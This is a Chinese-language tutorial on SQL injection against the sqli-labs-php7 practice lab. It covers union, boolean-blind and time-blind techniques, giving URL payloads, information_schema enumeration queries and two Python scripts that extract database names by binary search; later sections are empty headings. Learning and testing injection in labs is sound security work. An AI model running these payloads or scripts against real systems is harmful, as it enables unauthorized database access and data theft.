
# 什么是 SQL 注入

# SQL 注入类型



常见 SQL 注入类型有7种，分别是：联合注入、布尔盲注、时间盲注、宽字节注入、报错注入（floor 报错注入、updatexml报错注入、extractvalue报错注入）、堆叠注入、二次注入。

## MySQL 基础知识

### SQL语句中的特殊字符



### 注释

- 单行注释：
    - 单行注释可以使用 # 注释符，# 注释符后直接加注释内容
    - 单行注释可以使用--注释符，--注释符后需要加一个空格，注释才能生效
```
#从结果中删除重复行
SELECT DISTINCT product_id, purchase_price FROM Product;

-- 从结果中删除重复行
SELECT DISTINCT product_id, purchase_price FROM Product;
```


- 多行注释
  
多行注释使用 /* */ 注释符。/\* 用于注释内容的开头，\*/ 用于注释内容的结尾。多行注释格式如下

```
/*这条SELECT语句，
  会从结果中删除重复行*/
SELECT DISTINCT product_id, purchase_price FROM Product;
```


**小知识**

如果参数从 url 传入，url 中的参数值出现 +，空格，/，?，%，#，& 等特殊符号的时候就自动变成空格。所以 sql 注入常见的单行注释用 --+ ，如果想使用 # 做注释，就需要使用 url 编码，# 的 url 编码是 %23

举例
```
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' order by 1--+
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' order by 1%23
```




## MySQL 内置函数

发现 SQL 注入点之后，可以利用数据库的默认函数和自带的数据库，进一步收集数据库相关信息，包括数据库类型、版本号，数据库表等。利于后续漏洞利用

内置函数|描述|限制
-|-|-
version()|获取操作系统 版本号|
database()|获取当前使用的数据库|
user()|获取当前使用数据库的用户|
@@version_compile_os|获取操作系统类型|
@@datadir|获取数据库路径|

样例如下
```mysql
mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.7.33-0ubuntu0.16.04.1 |
+-------------------------+
1 row in set (0.00 sec)

mysql> select database();
+------------+
| database() |
+------------+
| security   |
+------------+
1 row in set (0.00 sec)

mysql> select user();
+----------------+
| user()         |
+----------------+
| root@localhost |
+----------------+
1 row in set (0.00 sec)

mysql> select @@version_compile_os;
+----------------------+
| @@version_compile_os |
+----------------------+
| Linux                |
+----------------------+
1 row in set (0.00 sec)

mysql> select @@datadir;
+-----------------+
| @@datadir       |
+-----------------+
| /var/lib/mysql/ |
+-----------------+
1 row in set (0.00 sec)

```
## MySQL 内置数据库

MySQL 默认数据库 information_schema 有三个关键数据表：schemata，tables, columns
- schemata 表中有字段叫 schema_name，存放的数据是数据库中所有数据库的名称
- tables 表中有字段 table_name(表名)，table_schema(表所在的数据库名)
- columns 表中有字段 column_name(字段名),  table_name(字段所在的表)

如此注入流程就如下：

查询语句|描述
-|-
select schema_name from information_schema.schemata|查询所有数据库	
select table_name from information_schema.tables where table_schema='xxx'|查询 xxx 数据库的所有表
select column_name from information_schema.columns where table_name='xxx'|查询 xxx 表的列名
select xxx from xxx|获取数据

样例如下
```mysql

mysql> select schema_name from information_schema.schemata;
+--------------------+
| schema_name        |
+--------------------+
| information_schema |
| challenges         |
| mysql              |
| performance_schema |
| security           |
| sys                |
+--------------------+
6 rows in set (0.00 sec)

mysql> select table_name from information_schema.tables where table_schema="security";
+------------+
| table_name |
+------------+
| emails     |
| referers   |
| uagents    |
| users      |
+------------+
4 rows in set (0.00 sec)

mysql>  select column_name from information_schema.columns where table_name="users";
+---------------------+
| column_name         |
+---------------------+
| USER                |
| CURRENT_CONNECTIONS |
| TOTAL_CONNECTIONS   |
| id                  |
| username            |
| password            |
+---------------------+
6 rows in set (0.00 sec)
```



## 联合注入

顾名思义，联合注入是使用联合查询进行注入的一种方式。联合注入应用的常见一般是有查询结果返回，结合联合查询，可以查询到自己想要的结果。

- 查询语句以 union 关键字连接起来，返回多条查询语句的并集。
- 每条查询语句的返回结果列数需要一致。

联合查询举例
```sql
mysql> select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 14 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)

mysql> select * from emails;
+----+------------------------+
| id | email_id               |
+----+------------------------+
|  1 | Dumb@dhakkan.com       |
|  2 | Angel@iloveu.com       |
|  3 | Dummy@dhakkan.local    |
|  4 | secure@dhakkan.local   |
|  5 | stupid@dhakkan.local   |
|  6 | superman@dhakkan.local |
|  7 | batman@dhakkan.local   |
|  8 | admin@dhakkan.com      |
+----+------------------------+
8 rows in set (0.00 sec)

mysql> select * from emails union select * from users;
ERROR 1222 (21000): The used SELECT statements have a different number of columns

mysql> select * from emails union select id, username from users;
+----+------------------------+
| id | email_id               |
+----+------------------------+
|  1 | Dumb@dhakkan.com       |
|  2 | Angel@iloveu.com       |
|  3 | Dummy@dhakkan.local    |
|  4 | secure@dhakkan.local   |
|  5 | stupid@dhakkan.local   |
|  6 | superman@dhakkan.local |
|  7 | batman@dhakkan.local   |
|  8 | admin@dhakkan.com      |
|  1 | Dumb                   |
|  2 | Angelina               |
|  3 | Dummy                  |
|  4 | secure                 |
|  5 | stupid                 |
|  6 | superman               |
|  7 | batman                 |
|  8 | admin                  |
|  9 | admin1                 |
| 10 | admin2                 |
| 11 | admin3                 |
| 12 | dhakkan                |
| 14 | admin4                 |
+----+------------------------+
21 rows in set (0.00 sec)


```
### 联合注入示例

联合注入关键在于确定数据库查询结果的列数，查询结果的列数，可以使用 使用 union select 或 order by 语句探测查询结果的字段。

如 [sqli-labs-php7](https://github.com/skyblueee/sqli-labs-php7) 的 Less-1

1. 使用 union select 语句爆破，payload 如下

```http
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' union select 1--+
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' union select 1,2--+
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' union select 1,2,3--+
```
前两个 payload 都是如下报错，union 前后两个语句列数不一样
![Alt text](images/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/image.png)
直到第三个 payload 才回显正确结果，说明原始查询结果有三列
![Alt text](images/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/image-1.png)

2. 使用 order by 指数（order by数字以2的n次方指数增加） 和 二分法爆破，payload 如下

```http
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' order by 1--+
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' order by 2--+
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' order by 4--+
http://192.168.154.135/sqli-labs-php7/Less-1/?id=1' order by 8--+
```
前两个 payload 都是能够正确回显
![Alt text](images/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/image-1.png)
直到第三个 payload，说明查询结果没有 4 列那么多，这时候就可以知道列数有三列。如果第三个payload是正常的，第四个payload是异常的，那么取中间值，也就是6((4+8)/2 = 6)继续爆破。
![Alt text](images/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/image-2.png)




### 联合注入常用函数

联合注入常使用如下字符串拼接函数

内置函数|描述|举例
-|-|-
concat(str1, str2, ...)|拼接字符串|concat("1", "2", "3") --> "123"
concat_ws(separator, str1, str2, ..)|拼接字符串，各个字符之间插入separator|concat("/", "1", "2", "3") --> "1/2/3"
group_concat(column_name)|将查询结果用,拼接成一个字符串|select group_concat(username) from users; --> "user1,user2,user3 .." 

样例
```mysql

mysql> select concat("123", 456);
+--------------------+
| concat("123", 456) |
+--------------------+
| 123456             |
+--------------------+
1 row in set (0.00 sec)

mysql> select concat("123", "456");
+----------------------+
| concat("123", "456") |
+----------------------+
| 123456               |
+----------------------+
1 row in set (0.00 sec)

mysql> select concat_ws("/","123", "456");
+-----------------------------+
| concat_ws("/","123", "456") |
+-----------------------------+
| 123/456                     |
+-----------------------------+
1 row in set (0.00 sec)

mysql> select group_concat(username) from users;
+---------------------------------------------------------------------------------------------+
| group_concat(username)                                                                      |
+---------------------------------------------------------------------------------------------+
| Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 |
+---------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)

```

## 布尔盲注

布尔盲注的常见一般是存在注入的 sql 语句的执行结果只返回布尔值 True或False，那么布尔盲注就是根据页面返回的True或者是False来得到数据库中的相关信息。

### 布尔注入常用函数

函数|描述|举例
-|-|- 
length(str)|返回值为字符串的字节长度|length("123") --> 3
ascii(char)|把字符转换成ascii码值的函数|ascii('0') --> 48
substr(str, pos, len)|在str中从pos开始的位置（起始位置为1），截取len个字符|
count()|统计表中记录的一个函数，返回匹配条件的行数|


sql 语句 limit关键字
- limit m ：检索前m行数据，显示1-10行数据（m>0）
- limit x, y：检索从x+1行开始的y行数据

```sql
mysql> select  length("123");
+---------------+
| length("123") |
+---------------+
|             3 |
+---------------+
1 row in set (0.00 sec)

mysql> select ascii('0');
+------------+
| ascii('0') |
+------------+
|         48 |
+------------+
1 row in set (0.01 sec)

mysql> select substr("12345", 2, 3);
+-----------------------+
| substr("12345", 2, 3) |
+-----------------------+
| 234                   |
+-----------------------+
1 row in set (0.00 sec)

mysql> select count(username) from security.users;
+-----------------+
| count(username) |
+-----------------+
|              13 |
+-----------------+
1 row in set (0.01 sec)

mysql> select * from security.users limit 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> select * from security.users limit 3;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
+----+----------+------------+
3 rows in set (0.00 sec)
 

```

### 布尔盲注示例

如 [sqli-labs-php7](https://github.com/skyblueee/sqli-labs-php7) 的 Less-8，利用布尔盲注获取数据库名

当返回的页面包含 "You are in" 字符串时为 true，否则为false

![正常访问返回的页面](images/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/image-3.png)
 

布尔盲注获取数据库名思路：

1. 获取数据库名的长度，遍历或用二分法爆破`http://192.168.154.135/sqli-labs-php7/Less-8/?id=1' and length(database())=n--+`种的n，当返回 true 的时候得到数据库的长度
2. 使用ascii、substr、database函数，利用二分法爆破数据库名称，如 `http://192.168.154.135/sqli-labs-php7/Less-8/?id=1' and ascii(substr(database(),  i, 1))=n--+` 种的第 i 个字符对应的 ascii 码为 n，那么对应的字符为 chr(n)

利用 python 脚本爆破数据库名如下： 

```python
import requests

url = "http://192.168.154.135/sqli-labs-php7/Less-8/"


def get_dblen(url):
    para = "?id=1' and length(database())=%d--+"
    url = url + para
    for i in range(20):
        rsp = requests.get(url % (i,))
        if "You are in" in rsp.content.decode("utf-8"):
            return i


def get_dbname(url):
    dblen = get_dblen(url)
    para = "?id=1' and ascii(substr(database(),  %d, 1))<%d--+"
    url = url + para
    dbname = []
    for i in range(1, dblen + 1):
        left = 0
        right = 256
        while True:
            if left == right or left  == (right - 1):
                dbname.append(chr(left))
                break
            rsp = requests.get(url % (i, (left + right) / 2))
            if "You are in" not in rsp.content.decode("utf-8"):
                left = int((left + right) / 2)
            else:
                right = int((left + right) / 2)
    return "".join(dbname)


if __name__ == "__main__":
    print(get_dbname(url))


```


## 时间盲注

在SQL注入过程中，无论注入是否成功，页面完全没有变化，无法通过页面判断是否存在注入，只能通过使用数据库的延时函数，根据执行返回的时长变化来判断是否存在注入。

时间盲注常使用 `if(expr1, expr2, expr3)`, 其中 expr2 通常为 sleep 函数，当 expr1 为 true 时，返回 expr2, 否则返回 expr3。时间盲注常可以看作是布尔注入。

如 [sqli-labs-php7](https://github.com/skyblueee/sqli-labs-php7) 的 Less-9，利用时间盲注获取数据库名

```python
import requests

url = "http://192.168.154.135/sqli-labs-php7/Less-9/"
             

def get_dblen(url):
    para = "?id=1' and if(length(database())=%d, sleep(0.1), null)--+"
    url = url + para
    rsp = requests.get(url % (8,))
    for i in range(20):
        rsp = requests.get(url % (i,))
        if rsp.elapsed.total_seconds() >= 0.1:
            return i


def get_dbname(url):
    dblen = get_dblen(url)
    para = "?id=1' and if(ascii(substr(database(),  %d, 1))<%d, sleep(0.1), null)--+"
    url = url + para
    dbname = []
    for i in range(1, dblen + 1):
        left = 0
        right = 256
        while True:
            if left == right or left == (right - 1):
                dbname.append(chr(left))
                break
            rsp = requests.get(url % (i, (left + right) / 2))
            if rsp.elapsed.total_seconds() < 0.1:
                left = int((left + right) / 2)
            else:
                right = int((left + right) / 2)
    return "".join(dbname)


if __name__ == "__main__":
    print(get_dbname(url))


```

## 宽字节注入


## 报错注入
### floor报错注入
### updatexml报错注入
### extractvalue报错注入
## 堆叠注入


## 二次注入